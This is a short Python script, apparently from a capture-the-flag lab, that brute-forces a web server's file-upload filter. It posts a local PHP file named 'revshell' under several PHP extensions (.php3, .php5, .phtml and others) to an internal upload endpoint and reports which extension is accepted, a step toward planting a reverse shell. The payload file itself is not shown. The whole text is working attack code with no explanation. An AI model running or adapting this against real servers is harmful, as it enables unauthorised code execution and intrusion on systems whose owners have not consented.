import requests

extensions = [
".php",
".php3",
".php4",
".php5",
".phtml"
]
url = "http://10.10.115.100:3333/internal/"
code = "baulgin.php"

for ext in extensions:
	name = f"revshell{ext}"
	files = {'file': (name, open(code))}
	r = requests.post(url, files=files)
	if "not allowed" not in r.text:
		print(f"Found extension: {ext}")